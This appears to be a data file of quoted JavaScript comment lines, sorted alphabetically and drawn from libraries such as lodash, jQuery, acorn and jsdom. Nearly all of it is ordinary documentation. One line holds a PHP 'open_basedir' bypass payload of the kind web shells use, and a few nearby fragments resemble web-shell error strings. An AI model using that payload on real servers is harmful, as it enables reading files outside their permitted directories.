"// => 'fred, barney, &amp; pebbles'"
"// => 'hello fred, barney, & pebbles'"
"// => 'hi-diddly-ho there, neig [...]'"
"// => 'hi-diddly-ho there, neighbo...'"
"// => 'hi-diddly-ho there,...'"
"// => Find the source of ""greeting.jst"" under the Sources tab or Resources panel of the web inspector."
"// => Logs 'a', 'b', then 'c' (iteration order is not guaranteed)."
"// => Logs 'c', 'b', then 'a' assuming `_.forIn` logs 'a', 'b', then 'c'."
"// => ['', '']"
"// => ['0', '1', '2']"
"// => ['0', '1']"
"// => ['a', '0', 'b', 'c']"
"// => ['a', 'a', 'a']"
"// => ['a', 'b', 'c'] (iteration order is not guaranteed)"
"// => ['a', 'b', 'c']"
"// => ['a', 'b'] (iteration order is not guaranteed)"
"// => ['a', 'b']"
"// => ['a', 'c']"
"// => ['b', 'b']"
"// => ['b', 'd']"
"// => ['barney', 'fred']"
"// => ['d', 'c', 'b', 'a']"
"// => ['foo', 'bar']"
"// => ['fred', 'barney', '&', 'pebbles']"
"// => ['fred', 'barney', 'pebbles']"
"// => ['h', 'i']"
"// => [-3, -2, -1, 0]"
"// => [0, -1, -2, -3]"
"// => [0, 0, 0, 0]"
"// => [0, 1, 2, 3]"
"// => [0, 5, 10, 15]"
"// => [1, 1, 1]"
"// => [1, 1, 2, 2]"
"// => [1, 2, 3, 4, 5]"
"// => [1, 2, 3, 4]"
"// => [1, 2, 3, [4], 5]"
"// => [1, 2, 3, [4]]"
"// => [1, 2, 3] (iteration order is not guaranteed)"
"// => [1, 2, 3]"
"// => [1, 2, [3, [4]], 5]"
"// => [1, 2] (iteration order is not guaranteed)"
"// => [1, 2]"
"// => [1, 3, 5]"
"// => [1, 3]"
"// => [1, 4]"
"// => [1.1, 2.3]"
"// => [1.2, 3.4]"
"// => [100, 10]"
"// => [111, 222]"
"// => [15, 10, 5, 0]"
"// => [16, 64] (iteration order is not guaranteed)"
"// => [16, 64]"
"// => [2, 0]"
"// => [2, 1]"
"// => [2, 2, 2]"
"// => [2, 3, 1]"
"// => [2, 3]"
"// => [2, 4]"
"// => [2.1, 1.2]"
"// => [3, 1]"
"// => [3, 2, 1, 0]"
"// => [3, 2, 1]"
"// => [3, 30, 300]"
"// => [3, 4]"
"// => [4, '*', '*', 10]"
"// => [4, 1, 3, 2]"
"// => [4, 1]"
"// => [4, 3, 2, 1]"
"// => [4, 5, 2, 3, 0, 1]"
"// => [4, 9]"
"// => [6, 8, 10]"
"// => [81, 6]"
"// => [9, 16]"
"// => [<li class=""orange"">Orange</li>]"
"// => [<ul id=""fruits""> ... </ul>]"
"// => [['1', '2', '3'], ['4', '5', '6']]"
"// => [['a', 'b', 'c'], ['d']]"
"// => [['a', 'b'], ['c', 'd']]"
"// => [['a', 'b'], [1, 2], [true, false]]"
"// => [['a', 1, true], ['b', 2, false]]"
"// => [['a', 1], ['b', 2], ['c', 3]] (iteration order is not guaranteed)"
"// => [['a', 1], ['b', 2]] (iteration order is not guaranteed)"
"// => [[1, 10, 100], [2, 20, 200]]"
"// => [[1, 1], [2, 2]]"
"// => [[1, 5, 7], [1, 2, 3]]"
"// => [[], []]"
"// => [false, false]"
"// => [true, true]"
"// => [undefined, undefined]"
"// => [{ 'a': 1 }, { 'a': 1 }]"
"// => [{ 'a': 1, 'b': 2 }]"
"// => [{ 'a': 1, 'b': 2, 'c': 3 }, { 'a': 4, 'b': 5, 'c': 6 }]"
"// => [{ 'a': 4, 'b': 5, 'c': 6 }]"
"// => [{ 'user': 'barney', 'age': 36, 'active': true }]"
"// => [{ 'user': 'fred', 'age': 40 }]"
"// => [{ 'x': 1 }, { 'x': 2 }]"
"// => [{ 'x': 1, 'y': 2 }, { 'x': 2, 'y': 1 }, { 'x': 1, 'y': 1 }]"
"// => [{ 'x': 1, 'y': 2 }, { 'x': 2, 'y': 1 }]"
"// => [{ 'x': 1, 'y': 2 }, { 'x': 5, 'y': 6 }]"
"// => [{ 'x': 1, 'y': 2 }]"
"// => [{ 'x': 2, 'y': 1 }, { 'x': 1, 'y': 1 }]"
"// => [{ 'x': 2, 'y': 1 }]"
"// => [{}, {}]"
"// => objects for ['barney', 'fred', 'pebbles']"
"// => objects for ['barney', 'fred']"
"// => objects for ['fred', 'barney']"
"// => objects for ['fred', 'pebbles']"
"// => objects for [['barney', 'pebbles'], ['fred']]"
"// => objects for [['barney', 34], ['barney', 36], ['fred', 30], ['fred', 48]]"
"// => objects for [['barney', 36], ['barney', 34], ['fred', 48], ['fred', 30]]"
"// => objects for [['barney', 36], ['barney', 34], ['fred', 48], ['fred', 40]]"
"// => objects for [['fred'], ['barney', 'pebbles']]"
"// => objects for [['pebbles'], ['barney', 'fred']]"
"// => { '1': 'c', '2': 'b' }"
"// => { '1': ['a', 'c'], '2': ['b'] } (iteration order is not guaranteed)"
"// => { '1': ['a', 'c'], '2': ['b'] }"
"// => { '3': 2, '5': 1 }"
"// => { '3': ['one', 'two'], '5': ['three'] }"
"// => { '4': 1, '6': 2 }"
"// => { '4': [4.2], '6': [6.1, 6.3] }"
"// => { 'a': 1, 'b': 2 }"
"// => { 'a': 1, 'b': 2, 'c': 3 }"
"// => { 'a': 1, 'b': 2, 'c': 3, 'd': 4 }"
"// => { 'a': 1, 'c': 3 }"
"// => { 'a': 4, 'b': 5, 'c': 6 }"
"// => { 'a': [1, 3], 'b': [2, 4] }"
"// => { 'a': [{ 'b': 2, 'c': 3 }, { 'd': 4, 'e': 5 }] }"
"// => { 'a': { 'b': 2, 'c': 3 } }"
"// => { 'a': { 'b': [{ 'c': 1 }, { 'd': 2 }] } }"
"// => { 'a': { 'dir': 'left', 'code': 97 }, 'd': { 'dir': 'right', 'code': 100 } }"
"// => { 'a1': 1, 'b2': 2 }"
"// => { 'done': false, 'value': 1 }"
"// => { 'done': false, 'value': 2 }"
"// => { 'done': true, 'value': undefined }"
"// => { 'fred': 40, 'pebbles': 1 } (iteration order is not guaranteed)"
"// => { 'group1': ['a', 'c'], 'group2': ['b'] }"
"// => { 'left': { 'dir': 'left', 'code': 97 }, 'right': { 'dir': 'right', 'code': 100 } }"
"// => { 'user': 'barney', 'age': 36 }"
"// > At the top level of a function, or script, function declarations are"
"// > There is an ordering, document order, defined on all the nodes in the"
"// > Thus, document order orders element nodes in order of the occurrence of"
"// > document after expansion of general entities. Thus, the document element"
"// @chdir('.');@ini_set('open_basedir','..');for($i=0;$i<10;$i++){@chdir('..');}@ini_set('open_basedir','/');"
"// @d optional document context (iframe, xml document)"
"// @mode boolean true for select, false for match"
"// @raises DOMException, LSException"
"// @return {boolean|null} when indeterminate value comes, returns null"
"// A ""function invocation"" expression,"
"// A ""measurement"" is a set of metrics recorded for each flush. We want"
"// A ""null"" reducer"
"// A .leading comment comes before the node, whereas a .trailing"
"// A HTTP proxy is quite simple. It is similar to a normal request, except the"
"// A URI is needed by this point, emit error if we haven't been able to get one"
"// A fallback to window.onload, that will always work"
"// A function can be passed as `onComment` option, which will"
"// A function can be passed as `onToken` option, which will"
"// A future refactoring would be to place _cssStyleSheet on all HTMLLinkElement and HTMLStyleElement instances, in"
"// A main version, followed optionally by a pre-release version and"
"// A new document { _id: 'id5', planet: 'Pluton', distance: 38 } has been added to the collection  "
"// A new document { _id: 'id5', planet: 'Pluton', inhabited: false } has been added to the collection"
"// A numeric identifier, or a non-numeric identifier."
"// A prop named ""dialog"" that requires an instance of Dialog."
"// A required enum prop named ""category""."
"// A similar object with same keys/values won't work,"
"// A simple gt/lt/eq thing, or just """" to indicate ""any version"""
"// A single `0`, or a non-zero digit followed by zero or more digits."
"// A slight delay, to avoid any current callbacks"
"// A tribute to the ""awesome hack by Dean Edwards"""
"// A.cleanup, B.onclose, B.cleanup"
"// A.onclose, A.cleanup"
"// A.onend, A.cleanup"
"// AMD loader is present. jQuery is a special case. For more information, see"
"// API doesn't specify any builder functions, and nobody uses E4X anymore."
"// AST node, it just prints the string. This behavior can be"
"// Abstracts constructing a Blob object, so it also works in older"
"// Accessing iframe documents after unload throws ""permission denied"" errors (jQuery #13936)"
"// Accessing xhr.upload fails in IE from a web worker, so just pretend it doesn't exist."
"// According to the jQuery API, an element does not ""contain"" itself"
"// Acorn is a tiny, fast JavaScript parser written in JavaScript."
"// Add a ""chain"" function, which will delegate to the wrapper."
"// Add checksum (handle both parent tags, comments and self-closing tags)"
"// Add default event behavior (click link to navigate, click button to submit"
"// Add elements to results, through postFinder if defined"
"// Add some isType methods: isArguments, isFunction, isString, isNumber, isDate, isRegExp."
"// Add the previous set of elements on the stack to the current set, optionally"
"// Add to the element's handler list, delegates in front"
"// Add verbose displayName to the function, which helps when looking"
"// Adding the second element, need to change to array."
"// Adds a 'Date' header in, signs it, and adds the"
"// Adjust SmartBuffer length (if offset + length is larger than managed length, adjust length)"
"// After the initial mount, we control selected-ness manually so don't pass"
"// After these have been cleaned up, we'll let them throw."
"// After this loop, replaceWith is the right-most leaf in the left subtree"
"// Ahhh, SQL makes this one soooooo easy."
"// All changes rolled back, including those that didn't trigger an error"
"// All codecs and aliases are kept here, keyed by encoding name/alias."
"// All even indices of this array are one line of the generated code,"
"// All of these are legacy, left because jsdom uses them internally :(. jsdom confused the idea of browser features"
"// All the axis tests from Step. We only get AxisSpecifier NodeTest,"
"// All timings will be relative to this request's startTime.  In order to do this,"
"// All token type variables start with an underscore, to make them"
"// Allow onerror to be called first,"
"// Allows request.get('https://1.2.3.4/').set('Host', 'example.com')"
"// Also, if we have no data yet, we can stand some more bytes."
"// Also, if we have no data yet, we can stand some"
"// Also, save errorCallback to a variable"
"// Alternately, set max digit bits to 28 since some"
"// Alternatively, you can pass multiple property names to .get instead of"
"// Alternatively, you can pester Ecma to add support for weak references,"
"// Although resultList was populated out of order, it should now be a dense"
"// Always set children to the same thing. In IE9, the selection range will"
"// An ""empty"" object has no enumerable own-properties."
"// An arg and interspersed args are not allowed, so done options."
"// An fullAncestor walk is like an ancestor walk, but triggers"
"// An internal function used for aggregate ""group by"" operations."
"// An optional string or URI prop named ""href""."
"// An optional string prop named ""description""."
"// And, if locations are used, the {line, column} object"
"// Android Browser returns percentage for some values,"
"// Anonymous function, e.g. function(){} /42"
"// Any combination of digits, letters, or hyphens."
"// Any native multicharacter token in default scope (includes octals, excludes character classes)"
"// Anything else beginning with a digit is an integer, octal"
"// Apply env-specific formatting (colors, etc.)"
"// Argument ""data"" should be string of html"
"// Array, all elements of a single type:"
"// Arrays and objects, will check for pointer equality"
"// As a last resort, toType returns a type that matches any value that"
"// As a special case, <host> can be the string ""localhost"" or the empty"
"// As efficiently as possible, decorate the comment object with"
"// As in, an element does not contain itself"
"// As of 5/8/2012 this will yield incorrect results for Mobile Safari, but there"
"// As well, disconnected nodes are said to be in a document"
"// Assign undefined instead of using delete, see Data#remove"
"// Assignment to a var, simple, 1 param."
"// AssignmentProperty has type === ""Property"""
"// Associate first line with ""lastMapping"""
"// Associate full lines with ""lastMapping"""
"// Associate the code between ""lastGeneratedColumn"" and"
"// Associate the remaining code in the current line with ""lastMapping"""
"// At first, we should calculate extended comment ranges."
"// At least Chrome 4+, Firefox 3.5+, Opera 10.x+, Safari 4+ [xxx = 1, xXx = 2]"
"// At least since V8 8.3, this implementation is faster than the previous"
"// At least, one hex digit is required."
"// At this point the path should be resolved to a full absolute path, but"
"// At this point, extra isn't border nor margin, so remove border"
"// At this point, extra isn't content nor padding, so add border"
"// At this point, extra isn't content, so add padding"
"// At this point, the http ClientRequest's internal `_header` field"
"// At this point, the range is completely trimmed and"
"// At this point, there's nothing in the queue, but we may have an"
"// Attempt to ""discover"" the data in"
"// Augment with `XRegExp.prototype` methods, but use native `RegExp` (avoid searching for special tokens)"
"// Avoid incorrect lookups, since named backreferences are added to match arrays"
"// Avoid issues by emitting the text node now,"
"// Avoid lazy use if the iteratee has a ""length"" value other than `1`."
"// Avoid non-left-click in FF but don't block IE radio events (#3861, gh-2343)"
"// B, B will update before the callback A's updater provided when calling"
"// B.onclose, B.cleanup"
"// B.onend, B.cleanup"
"// BAD: this is also unsupported, .pipe calls .end for you."
"// Back-compat hack: we have previously suggested nesting these under document, for jsdom.env at least."
"// Backwards compatibility, deprecated"
"// Bad Object, obviously no props at all"
"// Base ""constructor"" for jQuery.ajaxPrefilter and jQuery.ajaxTransport"
"// Base-64 stores 3 bytes in 4 chars, and pads the remainder."
"// Based off of the plugin by Clint Helfers, with permission."
"// Basic use, with named backreference"
"// Be more lenient with decoding compressed responses, since (very rarely)"
"// Because * is AND-ed with everything else in the comparator,"
"// Because `this.parseIdent(true)` doesn't check escape sequences, it needs the check of `this.containsEsc`."
"// Because each offset is encoded relative to the previous one,"
"// Because it can be sparse, it is represented as array of buckets by 256 chars each. Bucket can be null."
"// Because localStorage doesn't support saving the `undefined` type, we"
"// Because of that, this security measure has to be disabled in Safari 8."
"// Because the way the actual token is scanned, often the comments"
"// Before ending the request, we had to compute the length of the whole form, asyncly"
"// Before splicing in new elements, ensure they do not already appear in the"
"// Behaves like an Array's method, not like a jQuery method."
"// Beyond just the `path.resolve`, this is mostly for the benefit of Windows,"
"// Beyond this value, index getters/setters (i.e. array[0], array[1]) are so slow to"
"// BigInteger(int signum, byte[] magnitude)"
"// Bind a function to a context, optionally partially applying any"
"// Block comment ends with '*/' (char #42, char #47)."
"// Block comment starts with '/*' (char #47, char #42)."
"// Boolean attributes and ""value"" are not treated correctly"
"// BooleanLiteral, NullLiteral, or Punctuator."
"// Both box models exclude margin, so add it if we want it"
"// Both close and finish should trigger unpipe, but only once."
"// Break the loop if scale is unchanged or perfect, or if we've just had enough."
"// Browser does not implement `key`, polyfill as much of it as we can."
"// Browser doesn't support this storage library, so we exit the API"
"// Browsers without ""deltaMode"" is reporting in raw wheel delta where one"
"// Bubble up to document, then to window; watch for a global ownerDocument var (#9724)"
"// Buffer([127, 0, 0, 1])"
"// By convention, when a data property is converted to an accessor"
"// By default (no onload handler), if there is an error there, no operation will be possible so warn the user by throwing an exception"
"// By default, Underscore uses ERB-style template delimiters, change the"
"// By default, await identifiers are allowed to appear at the top-level scope only if ecmaVersion >= 2022."
"// By default, reserved words are not enforced. Disable"
"// By default, reserved words are only enforced if ecmaVersion >= 5."
"// By default, return all the DB data"
"// By handling mixins before any other properties, we ensure the same"
"// By happy coincidence, a (broken) gEBTN appears on DocumentFragment nodes too"
"// By their nature, BSTs can be hard to test (many possible cases, bug at one operation whose"
"// By this point, it would be profoundly surprising if /tmp didn't"
"// CONNECT ERROR"");"
"// CONNECT ERROR"".SQLite3::lastErrorMsg());"
"// CPU to a busy looping process, which can cause the program causing the lock"
"// CSS2 selected pseudo-classes, not part of current CSS3 drafts"
"// CSS3 :active, :hover, :focus"
"// CSS3 :link, :visited"
"// CSS3 :not, :checked, :enabled, :disabled, :target"
"// Call the preDispatch hook for the mapped type, and let it bail if desired"
"// Called at the end of every token. Sets `end`, `val`, and"
"// Caller can pass in a jQuery.Event object, Object, or just an event type string"
"// Calling .from on the builder function will construct an instance of the Def,"
"// Calling path.get(""child"") multiple times always returns the same"
"// Calling the builder function will construct an instance of the Def,"
"// Can Not Read"");}`,"
"// Can add propHook for ""elements"" to filter or add form elements"
"// Can be either `""script""` or `""module""`. This influences global"
"// Can use an empty set, since event contains the info"
"// Can't be in strict mode, several libs including ASP.NET trace"
"// Can't optimize arrays of integers longer than 65,535 elements."
"// Can't set base symbol to function in URL constructor, so don't need to check this"
"// Can't test the pointers in b as their order is randomized, but it is the same as with a"
"// Cannot use `value instanceof ArrayBuffer` or such here, as these"
"// Capture the context ID, setting it first if necessary"
"// Cast the key to a string, as that's all we can set as a key."
"// Catching errors makes debugging more difficult, so we start with the"
"// Catching errors makes debugging more difficult, so we start with"
"// Change the `http.ClientRequest` instance's ""path"" field"
"// Char to FreqOrder table ,"
"// Check each className given, space separated list"
"// Check for overlong encoding, but support Modified UTF-8 (encoding NULL as C0 80)"
"// Check if getElementsByTagName(""*"") returns only elements"
"// Check if it can be mapped by the source map, then update the mapping."
"// Check if the method is a setter, i.e. starts with 'set',"
"// Check if the node being unmounted was rendered by React, but isn't a"
"// Check if we're actually ready to finish, but don't emit yet"
"// Checks function params for various disallowed patterns such as using ""eval"""
"// Checks if offset is below zero, or the offset+length offset is beyond the total length of the managed data."
"// Checks that a user-supplied chunk is valid, especially for the particular"
"// Checks the type of a UTF-8 byte, whether it's ASCII, a leading byte, or a"
"// Children can be more than one argument, and those are transferred onto"
"// Chrome <37 and Android <5. In those versions, storing a blob will throw."
"// Class returns internal [[Class]] property, used to avoid cross-frame instanceof issues:"
"// Client-side DNS resolution for ""4"" and ""5"" socks proxy versions."
"// Clone ""words"" array"
"// Clone any incoming data and prepend the event, creating the handler arg list"
"// Close the original socket, and a new ""fake"" socket is returned"
"// Coerce regexes to strings and treat strings, primitives and objects,"
"// Collisions are highly unlikely, but this module is in the business of"
"// Comments can't have .comments, so it doesn't matter"
"// Common section was identical, longest one wins"
"// Compile the template source, escaping string literals appropriately."
"// Compute inv sub bytes, inv mix columns tables"
"// Compute sign, exponent, fraction"
"// Compute sub bytes, mix columns tables"
"// Config the localStorage backend, using options set in the config."
"// Constructor(ArrayBuffer buffer,"
"// Consume a semicolon, or, failing that, see if we are allowed to"
"// Contextify.connect(host.Promise.prototype.catch, Promise.prototype.catch);"
"// Contextify.connect(host.Promise.prototype.finally, Promise.prototype.finally);"
"// Contextify.connect(host.Promise.prototype.then, Promise.prototype.then);"
"// Continuation-Passing Style API.  The CookieJar itself will expose a ""*Sync"""
"// Contrary to `setAttribute`, object properties are properly"
"// Convert ""+="" or ""-="" to relative numbers (#7345)"
"// Convert ""normal"" to computed value"
"// Convert an object into a list of `[key, value]` pairs."
"// Convert string to WordArray, else assume WordArray already"
"// Converts a buffer to a string to store, serialized, in the backend"
"// Converts lists into objects. Pass either a single array of `[key, value]`"
"// Converts { foo: 'A', bar: [ 'b', 'B' ]} to"
"// Copy bytes to buffer, if provided"
"// Copy commas from after previous element, if any"
"// Copy the props, except the mouse listeners"
"// Copy those missing unsafe methods, if they are present"
"// Copyright (c) 2012, Mark Cavage. All rights reserved."
"// Copyright 2012 Joyent, Inc.  All rights reserved."
"// Copyright 2015 Joyent, Inc.  All rights reserved."
"// Copyright 2015 Joyent, Inc."
"// Copyright 2016 Joyent, Inc."
"// Copyright 2017 Joyent, Inc."
"// Copyright 2018 Joyent, Inc.	All rights reserved."
"// Copyright 2018 Joyent, Inc."
"// Copyright Joyent, Inc. and other Node contributors."
"// Could be useful for `this`, `new.target`, `super()`, `super.property`, and `super[property]`."
"// Create a Text node, set its data to title (which could be the empty"
"// Create a body element in the HTML namespace, and append it to the html"
"// Create a doctype, with ""html"" as its name and with its node document set"
"// Create a function bound to a given object (assigning `this`, and arguments,"
"// Create a head element in the HTML namespace, and append it to the html"
"// Create a title element in the HTML namespace, and append it to the head"
"// Create an array of nodes, recursing into arrays and parsing strings if"
"// Create an html element in the HTML namespace, and append it to doc."
"// Create innerHeight, innerWidth, height, width, outerHeight and outerWidth methods"
"// Create the script via .innerHTML so its ""parser-inserted"" flag is"
"// Creates instance with intenral Buffer size of 1024, and utf8 encoding. "
"// Creates instance with internal Buffer size of 1024, and utf8 encoding for strings."
"// Creating SmartBuffer with specified internal Buffer size. (Note: this is not a hard cap, the internal buffer will grow as needed)."
"// Crypto is kind of old and crusty.  Historically, its default string"
"// Current understanding of how to deal with Big5(-HKSCS) is in the Encoding Standard, http://encoding.spec.whatwg.org/#big5-encoder"
"// Currently, all major browsers except Chrome seems to support Lock-keys."
"// Currently, just skip the sequence and write current char."
"// Cwd has to exist, or else nothing works. That's serious."
"// DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR"
"// Deal with non-string keys, see issue #250"
"// Decode a generalized variable-length integer into `delta`,"
"// Decoder default can be changed: iconv.decode(buf, 'utf16', {defaultEncoding: 'utf-16be'});"
"// Deep compare the contents, ignoring non-numeric properties."
"// Def, the callback will never be called."
"// Default API, from Gaia/localStorage."
"// Default DB size is _JUST UNDER_ 5MB, as it's the highest size"
"// Default to ""DIRECT"" if a falsey value was returned (or nothing)"
"// Default value for a checkbox should be ""on"""
"// Defaults to UTF-16LE, as it's prevalent and default in Node."
"// Defaults to utf8, 1024 length internal Buffer."
"// Defaults to utf8, 4096 length internal Buffer."
"// Defers a function, scheduling it to run after the current call stack has"
"// Define a fallback version of the method in browsers (ahem, IE), where"
"// Define as an anonymous module so, through path mapping, it can be"
"// Define the hook, we'll check on the first run if it's really needed."
"// Delays a function for the given number of milliseconds, and then calls"
"// Deprecated hook for JSX spread, don't use this for anything."
"// Detect the request to connect same origin server,"
"// Detect, normalize options and install callbacks for jsonp requests"
"// Detecting them is expensive and confusing to users, and Chrome 37-42"
"// Determine event propagation path in advance, per W3C events spec (#9951)"
"// Disable support by replacing the ""interpolate"" delimiter."
"// Dividing a function by anything makes little sense,"
"// Do not reuse whitespace (or anything else, for that matter)"
"// Do not wrap help description, but indent newlines appropriately."
"// Do something with decoded strings, chunk-by-chunk."
"// Do something with parser, e.g."
"// Don't automatically add ""px"" to these possibly-unitless properties"
"// Don't bother with full unsigned long long conversion. When we have better WebIDL support generally, revisit."
"// Don't do default actions on window, that's where global variables be (#6170)"
"// Don't emit readable right away in sync mode, because this can trigger"
"// Don't get confused, there are 3 ""internal"" streams for each keyval pair"
"// Don't get/set attributes on text, comment and attribute nodes"
"// Don't get/set properties on text, comment and attribute nodes"
"// Don't handle errors here,"
"// Don't match these tokens if we're in a type, since they never can"
"// Don't process clicks on disabled elements (#6911, #8165, #11382, #11764)"
"// Don't re-export it here, the getter is defined in ""lib/index.js"""
"// Don't use ""cooked"". Since tagged template can use raw template"
"// Dot (.) U+002E can also start a floating-point number, hence the need"
"// Dot (.) char #46 can also start a floating-point number, hence the need"
"// Drive letters are mapped into the top of a file URI in various ways,"
"// Due to this, it is left to the user to implement at this time."
"// Duplex streams are both readable and writable, but share"
"// During page loading, document.write appends to the current element"
"// ECMAScript 6th Syntax, 11.1. 9 Template Literals"
"// ECMAScript 6th Syntax, 12.11 The switch statement"
"// ECMAScript 6th Syntax, 13 - Rest parameters"
"// ECMAScript 6th Syntax, 13.13 Method Definitions"
"// ECMAScript 6th Syntax, 13.2 Arrow Function Definitions"
"// ECMAScript 6th Syntax, 7.8.3 Numeric Literals"
"// END $1class $2\n# Constant Definition - post doc\nsnippet doc_dp\n	/**\n	 * ${1:undocumented constant}\n	 */${2}\n# Constant Definition\nsnippet doc_d\n	/**\n	 * ${3:undocumented constant}\n	 */\n	define(${1}, ${2});${4}\n# Function - post doc\nsnippet doc_fp\n	/**\n	 * ${1:undocumented function}\n	 *\n	 * @return ${2:void}\n	 * @author ${3:`g:snips_author`}\n	 */${4}\n# Function signature\nsnippet doc_s\n	/**\n	 * ${4:undocumented function}\n	 *\n	 * @return ${5:void}\n	 * @author ${6:`g:snips_author`}\n	 */\n	${1}function ${2}(${3});${7}\n# Function\nsnippet doc_f\n	/**\n	 * ${4:undocumented function}\n	 *\n	 * @return ${5:void}\n	 * @author ${6:`g:snips_author`}\n	 */\n	${1}function ${2}(${3})\n	{${7}\n	}\n# Header\nsnippet doc_h\n	/**\n	 * ${1}\n	 *\n	 * @author ${2:`g:snips_author`}\n	 * @version ${3:$Id$}\n	 * @copyright ${4:$2}, `strftime('%d %B, %Y')`\n	 * @package ${5:default}\n	 */\n\n# Interface\nsnippet interface\n	/**\n	 * ${2:undocumented class}\n	 *\n	 * @package ${3:default}\n	 * @author ${4:`g:snips_author`}\n	 */\n	interface ${1:$FILENAME}\n	{\n		${5}\n	}\n# class ...\nsnippet class\n	/**\n	 * ${1}\n	 */\n	class ${2:$FILENAME}\n	{\n		${3}\n		/**\n		 * ${4}\n		 */\n		${5:public} function ${6:__construct}(${7:argument})\n		{\n			${8:// code...}\n		}\n	}\n# define(...)\nsnippet def\n	define('${1}'${2});${3}\n# defined(...)\nsnippet def?\n	${1}defined('${2}')${3}\nsnippet wh\n	while (${1:/* condition */}) {\n		${2:// code...}\n	}\n# do ... while\nsnippet do\n	do {\n		${2:// code... }\n	} while (${1:/* condition */});\nsnippet if\n	if (${1:/* condition */}) {\n		${2:// code...}\n	}\nsnippet ife\n	if (${1:/* condition */}) {\n		${2:// code...}\n	} else {\n		${3:// code...}\n	}\n	${4}\nsnippet else\n	else {\n		${1:// code...}\n	}\nsnippet elseif\n	elseif (${1:/* condition */}) {\n		${2:// code...}\n	}\nsnippet switch\n	switch ($${1:variable}) {\n		case '${2:value}':\n			${3:// code...}\n			break;\n		${5}\n		default:\n			${4:// code...}\n			break;\n	}\nsnippet case\n	case '${1:value}':\n		${2:// code...}\n		break;${3}\nsnippet for\n	for ($${2:i} = 0; $$2 < ${1:count}; $$2${3:++}) {\n		${4: // code...}\n	}\nsnippet foreach\n	foreach ($${1:variable} as $${2:value}) {\n		${3:// code...}\n	}\nsnippet foreachk\n	foreach ($${1:variable} as $${2:key} => $${3:value}) {\n		${4:// code...}\n	}\n# $... = array (...)\nsnippet array\n	$${1:arrayName} = array('${2}' => ${3});${4}\nsnippet try\n	try {\n		${2}\n	} catch (${1:Exception} $e) {\n	}\n# lambda with closure\nsnippet lambda\n	${1:static }function (${2:args}) use (${3:&$x, $y /*put vars in scope (closure) */}) {\n		${4}\n	};\n# pre_dump();\nsnippet pd\n	echo '<pre>'; var_dump(${1}); echo '</pre>';\n# pre_dump(); die();\nsnippet pdd\n	echo '<pre>'; var_dump(${1}); echo '</pre>'; die(${2:});\nsnippet vd\n	var_dump(${1});\nsnippet vdd\n	var_dump(${1}); die(${2:});\nsnippet http_redirect\n	header (\""HTTP/1.1 301 Moved Permanently\"");\n	header (\""Location: \"".URL);\n	exit();\n# Getters & Setters\nsnippet gs\n	/**\n	 * Gets the value of ${1:foo}\n	 *\n	 * @return ${2:$1}\n	 */\n	public function get${3:$2}()\n	{\n		return $this->${4:$1};\n	}\n\n	/**\n	 * Sets the value of $1\n	 *\n	 * @param $2 $$1 ${5:description}\n	 *\n	 * @return ${6:$FILENAME}\n	 */\n	public function set$3(${7:$2 }$$1)\n	{\n		$this->$4 = $$1;\n		return $this;\n	}${8}\n# anotation, get, and set, useful for doctrine\nsnippet ags\n	/**\n	 * ${1:description}\n	 *\n	 * @${7}\n	 */\n	${2:protected} $${3:foo};\n\n	public function get${4:$3}()\n	{\n		return $this->$3;\n	}\n\n	public function set$4(${5:$4 }$${6:$3})\n	{\n		$this->$3 = $$6;\n		return $this;\n	}\nsnippet rett\n	return true;\nsnippet retf\n	return false;\nscope html\nsnippet <?\n	<?php\n\n	${1}\nsnippet <?e\n	<?php echo ${1} ?>\n# this one is for php5.4\nsnippet <?=\n	<?=${1}?>\nsnippet ifil\n	<?php if (${1:/* condition */}): ?>\n		${2:<!-- code... -->}\n	<?php endif; ?>\nsnippet ifeil\n	<?php if (${1:/* condition */}): ?>\n		${2:<!-- html... -->}\n	<?php else: ?>\n		${3:<!-- html... -->}\n	<?php endif; ?>\n	${4}\nsnippet foreachil\n	<?php foreach ($${1:variable} as $${2:value}): ?>\n		${3:<!-- html... -->}\n	<?php endforeach; ?>\nsnippet foreachkil\n	<?php foreach ($${1:variable} as $${2:key} => $${3:value}): ?>\n		${4:<!-- html... -->}\n	<?php endforeach; ?>\nscope html-tag\nsnippet ifil\\n\\\n	<?php if (${1:true}): ?>${2:code}<?php endif; ?>\nsnippet ifeil\\n\\\n	<?php if (${1:true}): ?>${2:code}<?php else: ?>${3:code}<?php endif; ?>${4}\n"",t.scope=""php""});                (function() {"
"// EOF, state.buffer will contain [<Buffer >, <Buffer 00 ...>]."
"// ES's hostParts are sometimes the other way round, if the value that is expected"
"// ES5: Make obj[index] an alias for obj._getter(index)/obj._setter(index, value)"
"// EUC-KR, KS_C_5601 and KS X 1001 are exactly the same."
"// Eg, '1.2.3.4' wants to coerce '2.3.4', not '3.4' or '4'"
"// Eg, >1.0.0 <1.0.1 is still a subset of <2.0.0"
"// Either fulfill, reject or reject with error"
"// Either scroll[Width/Height] or offset[Width/Height] or client[Width/Height],"
"// Either this is the first call, activity has stopped and we're at the"
"// Else, numbered backreference (without curly brackets)"
"// Else, special variable or numbered backreference (without curly brackets)"
"// Empty animations, or finishing resolves immediately"
"// Empty arrays are probably produced by defaults.emptyArray, in which"
"// Empty out this.bindings, just in cases."
"// Empty strings, null, undefined and ""auto"" are converted to 0."
"// Empty tree, insert as root"
"// Ensure that selections created by the ""loaded"" `initialize` function are"
"// Ensure the condition is true, otherwise throw an error."
"// Ensure the function name isn't a forbidden identifier in strict mode, e.g. 'eval'"
"// Ensure we have the right element, and that the user is not dragging a"
"// Ensuring both node_modules (the source one and build one), src and out directories exist"
"// Equal to ['hello', 'world']"
"// Equal to ['something else', 'some data for key 15']"
"// Equivalent to XRegExp(""(?<n1>(?<yo>a)\\2)\\1(?<nX>(?<yo>b)\\4)\\3()\\5\\1\\3\\k<nX>"")"
"// Error events call into user code, which may call Buffer.concat()"
"// Error occurred, failed to establish connection."
"// Error: ""this is not in the source map"" is not in the source map"
"// Error: Value: ""3"" does not type check..."
"// Esprima doesn't bother with this field, presumably because it's"
"// Essentially calls `this.reconcileTransaction.perform(method, scope, a)`"
"// Establish the root object, `window` in the browser, or `global` on the server."
"// Even if a property is a string containing a new line, the serialized"
"// Even if the original object is modified, the copied one isn't"
"// Even if this component is scheduled for another update in ReactUpdates,"
"// Even if value is undefined, localforage returns null"
"// Every buildable type will have its ""type"" field filled in"
"// Everything else in the universe uses 'utf8', though."
"// Everything is deserialized correctly, including deletes and indexes"
"// Except base64 encoder, which must keep its state."
"// Execute callbacks for all pending executions,"
"// Expand the Program node's .loc to include all comments, since"
"// Expect a token of a given type. If found, consume it, otherwise,"
"// Export the Underscore object for **Node.js**, with"
